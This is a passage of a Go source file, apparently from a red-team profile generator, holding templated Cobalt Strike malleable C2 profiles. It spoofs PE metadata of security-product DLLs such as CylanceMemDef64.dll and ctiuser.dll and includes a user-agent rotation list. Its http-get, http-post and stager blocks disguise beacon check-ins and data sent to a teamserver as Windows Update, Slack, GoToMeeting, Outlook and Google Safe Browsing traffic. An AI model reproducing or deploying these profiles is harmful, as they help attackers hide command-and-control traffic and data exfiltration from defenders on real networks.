set rich_header    "\xff\x46\xc6\x00\xbb\x27\xa8\x53\xbb\x27\xa8\x53\xbb\x27\xa8\x53\xaf\x4c\xa9\x52\xbe\x27\xa8\x53\xbb\x27\xa9\x53\xa1\x27\xa8\x53\xaf\x4c\xac\x52\xbc\x27\xa8\x53\xaf\x4c\xa5\x52\xb2\x27\xa8\x53\xaf\x4c\xa8\x52\xba\x27\xa8\x53\xaf\x4c\xab\x52\xb8\x27\xa8\x53\xaf\x4c\x57\x53\xba\x27\xa8\x53\xaf\x4c\xaa\x52\xba\x27\xa8\x53\x52\x69\x63\x68\xbb\x27\xa8\x53\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "367366";
set compile_time   "25 Jun 2044 21:28:59";
set entry_point    "102608";
set image_size_x86 "364544";
set image_size_x64 "364544";
set name           "wow64.dll";
set rich_header    "\x1e\xc2\x53\x5c\x5a\xa3\x3d\x0f\x5a\xa3\x3d\x0f\x5a\xa3\x3d\x0f\x4e\xc8\x3c\x0e\x5f\xa3\x3d\x0f\x5a\xa3\x3c\x0f\x13\xa1\x3d\x0f\x4e\xc8\x39\x0e\x5c\xa3\x3d\x0f\x4e\xc8\x3d\x0e\x5b\xa3\x3d\x0f\x4e\xc8\x3e\x0e\x5e\xa3\x3d\x0f\x4e\xc8\x30\x0e\x72\xa3\x3d\x0f\x4e\xc8\xc2\x0f\x5b\xa3\x3d\x0f\x4e\xc8\x3f\x0e\x5b\xa3\x3d\x0f\x52\x69\x63\x68\x5a\xa3\x3d\x0f\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "4372458";
set compile_time   "29 Nov 2022 18:59:21";
set entry_point    "1605936";
set image_size_x86 "4423680";
set image_size_x64 "4423680";
set name           "ctiuser.dll";
set rich_header    "\xb9\x56\x40\x85\xfd\x37\x2e\xd6\xfd\x37\x2e\xd6\xfd\x37\x2e\xd6\xe9\x5c\x2a\xd7\xea\x37\x2e\xd6\xe9\x5c\x2d\xd7\xf3\x37\x2e\xd6\xe9\x5c\x2b\xd7\x3d\x37\x2e\xd6\x05\x47\x2a\xd7\xec\x37\x2e\xd6\x05\x47\x2d\xd7\xf7\x37\x2e\xd6\xe9\x5c\x28\xd7\xff\x37\x2e\xd6\x45\x46\x2a\xd7\xb3\x37\x2e\xd6\xfd\x37\x2f\xd6\x61\x36\x2e\xd6\xe9\x5c\x2f\xd7\xfa\x37\x2e\xd6\x05\x47\x2b\xd7\x6c\x37\x2e\xd6\x45\x46\x2b\xd7\x8b\x37\x2e\xd6\x45\x46\x2e\xd7\xfc\x37\x2e\xd6\x45\x46\xd1\xd6\xfc\x37\x2e\xd6\xfd\x37\xb9\xd6\xfc\x37\x2e\xd6\x45\x46\x2c\xd7\xfc\x37\x2e\xd6\x52\x69\x63\x68\xfd\x37\x2e\xd6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "2434978";
set compile_time   "12 Dec 2022 11:46:37";
set entry_point    "1310336";
set image_size_x86 "2519040";
set image_size_x64 "2519040";
set name           "InProcessClient.dll";
set rich_header    "\x50\x58\xa2\x76\x14\x39\xcc\x25\x14\x39\xcc\x25\x14\x39\xcc\x25\x5f\x41\xcf\x24\x01\x39\xcc\x25\x5f\x41\xc9\x24\xaa\x39\xcc\x25\x74\x43\x31\x25\x15\x39\xcc\x25\x74\x43\xc8\x24\x05\x39\xcc\x25\x74\x43\xcf\x24\x1a\x39\xcc\x25\x76\x41\xc9\x24\x16\x39\xcc\x25\x70\x43\xcd\x24\x16\x39\xcc\x25\x74\x43\xc9\x24\xb5\x39\xcc\x25\x70\x43\xc9\x24\x17\x39\xcc\x25\x7e\x51\xc9\x24\x05\x39\xcc\x25\x5f\x41\xcd\x24\x1d\x39\xcc\x25\x5f\x41\xca\x24\x15\x39\xcc\x25\x5f\x41\xc8\x24\x37\x39\xcc\x25\x14\x39\xcd\x25\xf7\x38\xcc\x25\x70\x43\xc5\x24\xb6\x39\xcc\x25\x70\x43\xcf\x24\x16\x39\xcc\x25\x70\x43\xcc\x24\x15\x39\xcc\x25\x70\x43\x33\x25\x15\x39\xcc\x25\x70\x43\xce\x24\x15\x39\xcc\x25\x52\x69\x63\x68\x14\x39\xcc\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "73958";
set compile_time   "21 Jul 2023 12:15:13";
set entry_point    "5712";
set name           "umppc.dll";
set rich_header    "\xbe\x81\x57\xa3\xfa\xe0\x39\xf0\xfa\xe0\x39\xf0\xfa\xe0\x39\xf0\x23\x94\x3a\xf1\xfb\xe0\x39\xf0\x23\x94\x31\xf1\xf7\xe0\x39\xf0\x29\x92\x3a\xf1\xf9\xe0\x39\xf0\x29\x92\x3d\xf1\xfc\xe0\x39\xf0\x29\x92\x38\xf1\xf9\xe0\x39\xf0\xfa\xe0\x38\xf0\xc0\xe0\x39\xf0\x23\x94\x39\xf1\xfb\xe0\x39\xf0\x23\x94\xc6\xf0\xfb\xe0\x39\xf0\x23\x94\x3b\xf1\xfb\xe0\x39\xf0\x52\x69\x63\x68\xfa\xe0\x39\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "715814";
set compile_time   "14 Oct 2021 19:50:52";
set entry_point    "78800";
set image_size_x86 "704512";
set image_size_x64 "704512";
set name           "CylanceMemDef64.dll";
set rich_header    "\xd7\xf6\x0c\x93\x93\x97\x62\xc0\x93\x97\x62\xc0\x93\x97\x62\xc0\x6f\xe0\xdc\xc0\x91\x97\x62\xc0\x6f\xe0\xde\xc0\x97\x97\x62\xc0\x6f\xe0\xdb\xc0\x90\x97\x62\xc0\x93\x97\x63\xc0\xeb\x97\x62\xc0\xb0\x78\xb0\xc0\xd6\x97\x62\xc0\xb4\x51\xaf\xc0\x91\x97\x62\xc0\xf5\x79\xa8\xc0\x92\x97\x62\xc0\xb4\x51\xab\xc0\x92\x97\x62\xc0\x93\x97\xf5\xc0\x92\x97\x62\xc0\xf5\x79\xae\xc0\x92\x97\x62\xc0\x52\x69\x63\x68\x93\x97\x62\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";	
`,
}

var Useragent_list = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4301.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.133 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4390.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4474.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4562.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3818.0 Safari/537.36 Edg/77.0.188.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36 Edg/78.0.276.20",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3943.0 Safari/537.36 Edg/79.0.308.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.0 Safari/537.36 Edg/80.0.361.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.34 Safari/537.36 Edg/81.0.416.20",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; EIE10;PTPTWOL; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; xs-fUpniB-BAE8; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; BOIE9;PTPT; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; POS2; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; eraybfhe; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; D-M1-200309AC;D-M1-MSSP1; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0.1) Gecko/20100101 Firefox/86.0.1",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4433.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4391.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; MSAppHost/2.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; ASTE; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALEJS; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TCO_20200224223500; rv:11.0) like Gecko",
	"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
	"Mozilla/5.0 (X11; Linux x86_64:71.0) Gecko/20100101 Firefox/71.0",
	"Mozilla/4.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0",
	"Mozilla/5.0 (X11; Linux x86_64:75.0) Gecko/20100101 Firefox/75.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4065.1 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.31",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.131 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.10 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.130 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:83.0) Gecko/20100101 Firefox/83.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:86.0) Gecko/20100101 Firefox/86.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:84.1) Gecko/20100101 Firefox/84.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.1) Gecko/20100101 Firefox/85.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
}

var HTTP_GET_POST_list = []string{
	`
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {
{{.Variables.HTTP_GET_URI}}


client {

	header "Accept" "*/*";
	header "Host" "{{.Variables.Host}}";
	
	metadata {
		{{.Variables.metadata_mode}};
		append ".cab";
		uri-append;
	}
}


server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {

		print;
	}
}
}

http-post {
{{.Variables.HTTP_POST_URI}}

set verb "GET";

client {

	header "Accept" "*/*";


	id {
		prepend "download.windowsupdate.com/c/";
		header "Host";
	}


	output {
		{{.Variables.metadata_mode}};
		append ".cab";
		uri-append;
	}
}

server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {
		print;
	}
}
}

http-stager {
	server {
		header "Content-Type" "application/vnd.ms-cab-compressed";
	}
}`, `

http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {

{{.Variables.HTTP_GET_URI}}

client {

	header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Accept-Language" "en-US";
header "Connection" "close";

	
	metadata {
	{{.Variables.metadata_mode}};
	append ";_ga=GA1.2.875";
	append ";__ar_v4=%8867UMDGS643";
	prepend "d=";
	prepend "_ga=GA1.2.875;";
	prepend "b=.12vPkW22o;";
	header "Cookie";

	}

}

server {

header "Content-Type" "text/html; charset=utf-8";
header "Connection" "close";
header "Server" "Apache";
header "X-XSS-Protection" "0";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Slack-Backend" "h";
header "Pragma" "no-cache";
header "Cache-Control" "private, no-cache, no-store, must-revalidate";
header "X-Frame-Options" "SAMEORIGIN";
header "Vary" "Accept-Encoding";
header "X-Via" "haproxy-www-w6k7";
	

	output {

		{{.Variables.metadata_mode}};

	prepend "<!DOCTYPE html>
<html lang=\"en-US\" class=\"supports_custom_scrollbar\">

<head>

<meta charset=\"utf-8\">
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
<meta name=\"referrer\" content=\"no-referrer\">
<meta name=\"superfish\" content=\"nofish\">
	<title>Microsoft Developer Chat Slack</title>
<meta name=\"author\" content=\"Slack\">
	

<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";

	append "\"> </script>";
	
	append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">


<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">
<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>

<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">
	Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.		<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>
</div>

<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">
	We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\"inline_block no_wrap\">
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>
	</span>
</div>";

		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Accept-Language" "en-US";     
	
	output {
		{{.Variables.metadata_mode}};
	
	append ";_ga=GA1.2.875";
	append "__ar_v4=%8867UMDGS643";
	prepend "d=";
	prepend "_ga=GA1.2.875;";
	prepend "b=.12vPkW22o;";
	header "Cookie";


	}


	id {
		{{.Variables.metadata_mode}};
	prepend "GA1.";
	header "_ga";

	}
}

server {

header "Content-Type" "application/json; charset=utf-8";
header "Connection" "close";
header "Server" "Apache";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Content-Type-Options" "nosniff";
header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
header "X-XSS-Protection" "0";
header "X-Slack-Backend" "h";
header "Vary" "Accept-Encoding";
header "Access-Control-Allow-Origin" "*";
header "X-Via" "haproxy-www-6g1x";
	

	output {
		{{.Variables.metadata_mode}};

	prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
	append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";

		print;
	}
}
}

http-stager {

set uri_x86 "/messages/DALBNSf25";
set uri_x64 "/messages/DALBNSF25";

client {
header "Accept" "*/*";
header "Accept-Language" "en-US,en;q=0.5";
header "Accept-Encoding" "gzip, deflate";
header "Connection" "close";
}

server {
header "Content-Type" "text/html; charset=utf-8";        
header "Connection" "close";
header "Server" "Apache";
header "X-XSS-Protection" "0";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Slack-Backend" "h";
header "Pragma" "no-cache";
header "Cache-Control" "private, no-cache, no-store, must-revalidate";
header "X-Frame-Options" "SAMEORIGIN";
header "Vary" "Accept-Encoding";
header "X-Via" "haproxy-www-suhx";

}


}	
`, `
http-config {
	set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
	header "Content-Type" "text/html;charset=UTF-8";
	header "Connection" "close";
	header "Brightspot-Id" "00000459-72af-a783-feef2189";
	header "Cache-Control" "max-age={{.Variables.maxage}}";
	header "Server" "Apache-Coyote/1.1";
	header "X-Content-Type-Options" "nosniff";
	header "X-Powered-By" "Brightspot";
	header "Vary" "Accept-Encoding";
	set trust_x_forwarded_for "{{.Variables.forward}}";

}

http-get {

{{.Variables.HTTP_GET_URI}}

client {

	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";

	metadata {
	{{.Variables.metadata_mode}}; 
	parameter "_";

	}

}

server {
	
	output {

		{{.Variables.metadata_mode}};	    

	prepend "content=";
	prepend "<meta name=\"google-site-verification\"\n";
	prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	prepend "        <meta charset=\"UTF-8\">\n";
	prepend "    <head>\n";
	prepend "<html lang=\"en\">\n";
	prepend "<!DOCTYPE html>\n";

	append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	append "<script type=\"text/javascript\">\n";
	append "  var _kiq = _kiq || [];\n";
	append "  (function(){\n";
	append "    setTimeout(function(){\n";
	append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	append "d.createElement('script'); s.type = 'text/javascript';\n";
	append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	append "f.parentNode.insertBefore(s, f);\n";
	append "    }, 1);\n";
	append "})();\n";
	append "</script>\n";
	append "</body>\n";
	append "</html>\n";
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}
set verb "GET";

client {

	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en";
	header "Connection" "close";     
	
	output {
		{{.Variables.metadata_mode}}; 
	parameter "includeMeetingsICoorganize";
	}


	id {
		{{.Variables.metadata_mode}};
	parameter "includeCoorganizers";

	}
}

server {

	output {
		{{.Variables.metadata_mode}};	    

	prepend "content=";
	prepend "<meta name=\"google-site-verification\"\n";
	prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	prepend "        <meta charset=\"UTF-8\">\n";
	prepend "    <head>\n";
	prepend "<html lang=\"en\">\n";
	prepend "<!DOCTYPE html>\n";

	append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	append "<script type=\"text/javascript\">\n";
	append "  var _kiq = _kiq || [];\n";
	append "  (function(){\n";
	append "    setTimeout(function(){\n";
	append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	append "d.createElement('script'); s.type = 'text/javascript';\n";
	append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	append "f.parentNode.insertBefore(s, f);\n";
	append "    }, 1);\n";
	append "})();\n";
	append "</script>\n";
	append "</body>\n";
	append "</html>\n";
		print;
	}
}
}

http-stager {

set uri_x86 "/Meeting/{{.Variables.UValue}}/";
set uri_x64 "/Meeting/{{.Variables.UValue}}/";

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
}

server {

}


}
`, `
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42={{.Variables.UValue}}";
	
	metadata {
		{{.Variables.metadata_mode}};
		parameter "wa";


	}

parameter "path" "/calendar";

}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd0{{.Variables.namprdnumber}}.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		{{.Variables.metadata_mode}};
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}
set verb "GET";

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";     
	
	output {
		{{.Variables.metadata_mode}};
	parameter "wa";


	}



	id {
		{{.Variables.metadata_mode}};

	prepend "wla42=";
	prepend "xid=730bf7;";
	prepend "MSPAuth=3EkAjDKjI;";
	prepend "ClientId=1C0F6C5D910F9;";
	prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	header "Cookie";


	}
}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd0{{.Variables.namprdnumber}}.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		{{.Variables.metadata_mode}};
		print;
	}
}
}

http-stager {

set uri_x86 "/rpc/{{.Variables.number86}}";
set uri_x64 "/rpc/{{.Variables.number64}}";

client {
	header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
}

server {
	header "Server" "nginx";    
}


}
`, `

http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {

{{.Variables.HTTP_GET_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";
	metadata {
		{{.Variables.metadata_mode}};
		prepend "REF=ID={{.Variables.UValue}}";
		header "Cookie";
	}
}

server {
	header "Content-Type" "application/vnd.google.safebrowsing-chunk";
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	id {
		{{.Variables.metadata_mode}};
		prepend "U={{.Variables.UValue}}";
		prepend "REF=ID=";
		header "Cookie";
	}

	output {
		print;
	}
}

server {
	header "Content-Type" "application/vnd.google.safebrowsing-chunk";
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {			print;
	}
}
}`, `
http-config {

	#set "true" if teamserver is behind redirector
